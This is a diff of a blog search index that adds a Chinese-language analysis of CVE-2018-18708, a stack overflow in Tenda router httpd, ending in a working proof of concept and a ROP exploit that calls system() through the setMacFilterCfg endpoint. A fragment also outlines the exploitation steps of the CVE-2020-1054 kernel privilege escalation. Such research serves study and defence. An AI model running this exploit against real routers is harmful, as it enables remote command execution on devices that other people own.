@@ -1,6 +1,192 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CVE-2018-18708 Tenda路由器栈溢出分析</title>
+    <url>/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2018-18708是Tenda路由器的httpd存在缓冲区溢出漏洞。可以利用该漏洞造成拒绝服务。</p>
+<p>影响版本：</p>
+<pre class="line-numbers language-none"><code class="language-none">AC7 V15.03.06.44_CN
+AC9 V15.03.05.19_CN
+AC10 V15.03.06.23_CN
+AC15 V15.03.05.19_CN
+AC18 V15.03.05.19(6318)_CN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h3><p>US_AC15V1.0BR_V15.03.05.19_multi_TD01</p>
+<h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>提取固件运行httpd可执行文件</p>
+<pre class="line-numbers language-none"><code class="language-none">binwalk -Me US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查看文件信息，是arm</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116165640011.png"></p>
+<p>qemu执行</p>
+<pre class="line-numbers language-none"><code class="language-none">cd _US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root
+cp $(which qemu-arm-static) ./
+sudo chroot ./ ./qemu-arm-static ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>会卡在Welcome to</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114111007129.png"></p>
+<h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>ida分析发现sub_2E420，发现welcome to之后有两处check，第一处check不通过会进入休眠状态，第二个检查连接情况，不通过会打印连接失败。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114112513082.png"></p>
+<p>patch掉这两处的检测</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144110897.png"></p>
+<p>patch掉之后继续执行</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144236394.png"></p>
+<p>安装uml-utilities</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo apt install uml-utilities<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>安装bridge-utils</p>
+<pre class="line-numbers language-none"><code class="language-none">https://mirrors.edge.kernel.org/pub/linux/utils/net/bridge-utils/bridge-utils-1.7.1.tar.xz
+tar -xvf bridge-utils-1.7.1.tar.xz
+autoconf
+./configure
+make
+sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113136378.png"></p>
+<h4 id="定位ip"><a href="#定位ip" class="headerlink" title="定位ip"></a>定位ip</h4><p>搜索字符串Listen ip定位到sub_1B84C函数</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113711000.png"></p>
+<p>分析调用链</p>
+<p><code>sub_2E420 -&gt; sub_2E9EC -&gt; sub_29510  -&gt; sub_29818 -&gt;  sub_1B84C</code></p>
+<p>函数sub_29818调用了sub_1B84C</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115132854149.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpd
+gdb-multiarch
+set architecture arm
+b*0x1B84C
+target remote:1111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115142522808.png"></p>
+<p>对ip参数v8进行定位</p>
+<p>v8和s.sa_data[2]、a1有关</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143459247.png"></p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143338834.png"></p>
+<p>往上回溯，sub_29818调用了sub_1B84C，sub_29818的v8是了sub_1B84C的第一个参数a1</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115144144585.png"></p>
+<p>往上回溯到sub_2E420，ip的值与s和v19有关。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115150620540.png"></p>
+<p>查看getIfIp</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115151018366.png"></p>
+<p>getIfIp为外部导入函数，位于libcommon.so中</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160146351.png"></p>
+<p>ioctl有三个参数，第一个参数fd由socket()系统调用返回，第二个参数获取IP地址。第三个参数与getLanIfName函数有关。</p>
+<p>因此函数整体流程为获取IP地址返回v2，v2的值为0不会进入if循环，ip的值由v19决定，v19是getIfIp函数的第二个参数v2，系统调用获取IP后赋给a2(v19)。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160907362.png"></p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161237390.png"></p>
+<p>getLanIfName会调用get_eth_name函数，参数写死为0，get_eth_name在libChipApi.so中，查看libChipApi.so中的get_eth_name函数，函数返回v1，为网卡名称</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161516417.png"></p>
+<h4 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h4><p>因此整体流程为getLanIfName函数调用get_eth_name函数获取网卡名称，将网卡名称做为参数输入到getIfIp中。函数寻找名称为br0的网卡的ip地址传递给v19。因此让程序监听正确的ip地址需要新建br0网卡。</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo brctl addbr br0 
+sudo brctl addif br0 eth0
+sudo ifconfig br0 up
+sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>重新启动找到了br0网卡并获取了ip地址</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141128835.png"></p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141227111.png"></p>
+<h3 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h3><pre class="line-numbers language-none"><code class="language-none">函数调用关系：sub_2E420 -&gt;  sub_2E9EC  -&gt;  sub_42378  -&gt;  formSetMacFilterCfg  -&gt;  sub_C14DC  -&gt;  sub_C17A0  -&gt;  sub_C24C0
+缓冲区：sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12
+字符串src：sub_2BA8C的返回值 -&gt; formSetMacFilterCfg的v17 -&gt; sub_C14DC的a2 -&gt; sub_C17A0的a2 -&gt; sub_C24C0的a1 -&gt; src<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="sub-C24C0"><a href="#sub-C24C0" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p>漏洞点在sub_C24C0的strcpy函数</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114180104515.png"></p>
+<h4 id="sub-C17A0"><a href="#sub-C17A0" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>溢出字符串src是sub_C24C0函数的第一个参数a1，来自sub_C17A0的第二个参数a2</p>
+<p>缓冲区a2是sub_C24C0函数的第二个参数a2，来自sub_C17A0的v12。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110605912.png"></p>
+<h4 id="sub-C14DC"><a href="#sub-C14DC" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p>sub_C17A0的第二个参数a2来自sub_C14DC的第二个参数a2</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110852924.png"></p>
+<h4 id="formSetMacFilterCfg"><a href="#formSetMacFilterCfg" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数调用了sub_C14DC，sub_C14DC的第二个参数a2来自formSetMacFilterCfg的v17，v17是sub_2BA8C的返回值，程序获取到http请求的deviceList的值，传递给sub_C24C0函数的漏洞点。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115100854082.png"></p>
+<h3 id="调用链分支跳转"><a href="#调用链分支跳转" class="headerlink" title="调用链分支跳转"></a>调用链分支跳转</h3><p>函数中有不同功能的处理函数，显示请求到指定路径会调用相应的处理函数。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115172430094.png"></p>
+<p>进入formSetMacFilterCfg函数需要访问/goform/setMacFilterCfg</p>
+<h4 id="formSetMacFilterCfg-1"><a href="#formSetMacFilterCfg-1" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数存在两个分支，sub_C10D0和sub_C14DC</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173154042.png"></p>
+<p>v19为0才会进入sub_C14DC函数，因此sub_C10D0的返回值需要为0</p>
+<h4 id="sub-C10D0"><a href="#sub-C10D0" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173814704.png"></p>
+<p>sub_C10D0的返回值为0需要输入的数据a1为black或者white</p>
+<h4 id="sub-C24C0-1"><a href="#sub-C24C0-1" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115174215338.png"></p>
+<p>最终到达漏洞点之后会检测包含\r的字符串</p>
+<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>访问 <a href="http://192.168.130.137/goform/setMacFilterCfg">http://192.168.130.137/goform/setMacFilterCfg</a> 抓包</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141526174.png"></p>
+<p>返回{“errCode”:2}</p>
+<h4 id="formSetMacFilterCfg-2"><a href="#formSetMacFilterCfg-2" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>进入formSetMacFilterCfg函数，查看setMacFilterCfg接口对应的处理过程。</p>
+<p>调用了sub_2BA8C 和 sub_C10D0和sub_C10DC</p>
+<p>sub_2BA8C获取前端传过来的表单中获取对应的值。之后传入sub_C210D0</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115183255078.png"></p>
+<p>之后会对v19进行判断</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193726115.png"></p>
+<h4 id="sub-C10D0-1"><a href="#sub-C10D0-1" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p>对传入的值进行strcmp比较，决定返回的值。</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193936050.png">判断是black还是white，如果满足其中一个返回0，否则返回2。如果没有就会返回2，所以抓包返回结果为{“errCode”:2}</p>
+<p>所以必须传参setMacFilterCfg为black或者white</p>
+<h4 id="sub-C14DC-1"><a href="#sub-C14DC-1" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115195021958.png"></p>
+<p>第二个参数是需要有\n，并且返回其地址。</p>
+<p>之后都会进入sub_C17A0函数</p>
+<h4 id="sub-C17A0-1"><a href="#sub-C17A0-1" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>调用了sub_C24C0，将deviceList和v12传入</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093215098.png"></p>
+<h4 id="sub-C24C0-2"><a href="#sub-C24C0-2" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093614037.png"></p>
+<h3 id="触发测试"><a href="#触发测试" class="headerlink" title="触发测试"></a>触发测试</h3><p>sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12，大小为176</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117141812438.png"></p>
+<p>根据http post请求内容构造</p>
+<pre class="line-numbers language-none"><code class="language-none">import requests
+url = "http://192.168.130.137/goform/setMacFilterCfg"
+cookie = {"Cookie":"password=csplqw"}
+data = {"macFilterType": "black", "deviceList":"\r" +  "A" * 176 + "bbbb"}
+requests.post(url, cookies=cookie, data=data)
+requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>测试</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpd
+
+gdb-multiarch ./bin/httpd
+target remote:1111
+
+python poc.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117144236144.png"></p>
+<p>正好覆盖</p>
+<h2 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p>开启了NX保护</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117145129715.png"></p>
+<h3 id="libc基址"><a href="#libc基址" class="headerlink" title="libc基址"></a>libc基址</h3><p>strcpy函数下断点找函数地址，0x3fdda508</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118173858830.png"></p>
+<p>找偏移</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174133012.png"></p>
+<p>算基址</p>
+<p>0x3fdda508-3e508=0x3fd9C000</p>
+<h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><pre class="line-numbers language-none"><code class="language-none">ROPgadget --binary libc.so.0 --only "pop" | grep r3
+ROPgadget --binary libc.so.0 | grep "mov r0, sp ; blx r3"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155024462.png"></p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155334715.png"></p>
+<p>使用<code>0x00018298 : pop {r3, pc}</code>和 <code>0x00040cb8 : mov r0, sp ; blx r3</code>来构造rop。将第一个r3改成system_addr，将命令放在sp上，之后跳转到system_addr。</p>
+<h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p><code>readelf -s libc.so.0 | grep system</code>找system偏移</p>
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117161402380.png"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>payload结构：[offset,gadget1,system,gadget2]</p>
+<pre class="line-numbers language-none"><code class="language-none">import requests
+from pwn import *
+cmd = b"echo hello"
+libc_base = 0x3fd9C000
+system_offset = 0x005a270
+gadget1_offset = 0x00018298
+gadget2_offset = 0x00040cb8
+system_addr = libc_base + system_offset
+gadget1 = gadget1_offset + libc_base
+gadget2 = gadget2_offset + libc_base
+payload = b"A"*176 + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd
+url = "http://192.168.130.137/goform/setMacFilterCfg"
+cookie = {"Cookie":"password=csplqw"}
+data = {"macFilterType": "black", "deviceList":b"\r" + payload}
+requests.post(url, cookies=cookie, data=data)
+requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174737035.png"></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2020-1054越界写入本地提权分析</title>
     <url>/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2020-1054是win32k.sys内核模块的oob(out of band)漏洞。成功利用可以导致权限提升。漏洞存在于win32k!vStrWrite01函数中，函数在对BitMap对象中的pvScan0成员指向的像素区域进行读写的时候，没有判断读写的地址是否超过BitMap对象的像素点范围，是否越界，导致BSOD的产生。通过合理的内存布局，可以利用漏洞扩大目标BitMap对象的sizelBitmap来扩大BitMap对象的可读写范围，利用扩大读写范围的BitMap对象来修改另一个BitMap对象的pvScan0就能实现任意地址读写。</p>
@@ -208,244 +394,6 @@ int main(){
 <p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906095832694.png"></p>
 <h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>CreateCompatibleBitmap申请VulBITMAP，并获得VulBITMAP的内核地址<br>计算oob读写地址<br>在oob读地址处申请BITMAP1，在oob写处申请BITMAP2，大小为0x7000<br>触发漏洞，读取BITMAP1中的sIzlBitmap值，修改BITMAP2对象的sizlBitmap值，对BITMAP2使用SetBitmapBits和GetBitmapBits越界读写BITMAP3的pvScan0<br>BITMAP2作为Manager，BITMAP3作为worker，实现任意读写，替换token等提权</p>
 <p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906095502566.png"></p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2018-18708 Tenda路由器栈溢出分析</title>
-    <url>/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2018-18708是Tenda路由器的httpd存在缓冲区溢出漏洞。可以利用该漏洞造成拒绝服务。</p>
-<p>影响版本：</p>
-<pre class="line-numbers language-none"><code class="language-none">AC7 V15.03.06.44_CN
-AC9 V15.03.05.19_CN
-AC10 V15.03.06.23_CN
-AC15 V15.03.05.19_CN
-AC18 V15.03.05.19(6318)_CN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h3><p>US_AC15V1.0BR_V15.03.05.19_multi_TD01</p>
-<h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>提取固件运行httpd可执行文件</p>
-<pre class="line-numbers language-none"><code class="language-none">binwalk -Me US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>查看文件信息，是arm</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116165640011.png"></p>
-<p>qemu执行</p>
-<pre class="line-numbers language-none"><code class="language-none">cd _US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root
-cp $(which qemu-arm-static) ./
-sudo chroot ./ ./qemu-arm-static ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>会卡在Welcome to</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114111007129.png"></p>
-<h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>ida分析发现sub_2E420，发现welcome to之后有两处check，第一处check不通过会进入休眠状态，第二个检查连接情况，不通过会打印连接失败。</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114112513082.png"></p>
-<p>patch掉这两处的检测</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144110897.png"></p>
-<p>patch掉之后继续执行</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144236394.png"></p>
-<p>安装uml-utilities</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo apt install uml-utilities<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>安装bridge-utils</p>
-<pre class="line-numbers language-none"><code class="language-none">https://mirrors.edge.kernel.org/pub/linux/utils/net/bridge-utils/bridge-utils-1.7.1.tar.xz
-tar -xvf bridge-utils-1.7.1.tar.xz
-autoconf
-./configure
-make
-sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113136378.png"></p>
-<h4 id="定位ip"><a href="#定位ip" class="headerlink" title="定位ip"></a>定位ip</h4><p>搜索字符串Listen ip定位到sub_1B84C函数</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113711000.png"></p>
-<p>分析调用链</p>
-<p><code>sub_2E420 -&gt; sub_2E9EC -&gt; sub_29510  -&gt; sub_29818 -&gt;  sub_1B84C</code></p>
-<p>函数sub_29818调用了sub_1B84C</p>
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115132854149.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpd
-gdb-multiarch
-set architecture arm
-b*0x1B84C
-target remote:1111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115142522808.png"></p>
-<p>对ip参数v8进行定位</p>
